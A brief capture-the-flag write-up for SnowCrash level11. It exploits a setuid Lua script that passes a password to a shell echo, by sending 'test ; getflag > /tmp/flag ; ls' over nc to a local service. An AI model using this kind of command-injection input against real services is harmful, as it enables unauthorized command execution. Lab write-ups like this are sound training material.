# Snowcrash11

This time only a .lua file, a script

```sh
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```

We have access to a lua script containing a hash, we can find it online :
https://sha1.gromweb.com/?hash=f05d1d066fb246efe0c6f7d095f909a7a0cf34a0

It doens't seem to help tho

We can see that the hash function uses echo with an argument that we can provide next, wonder if we can use getpass this way

```sh
level11:~$ nc 127.0.0.1 5151
Password: test ; getflag > /tmp/flag ; ls
Erf nope..
level11:~$ cat /tmp/flag
Check flag.Here is your token : REDACTED
```
Again, no need to go to flag account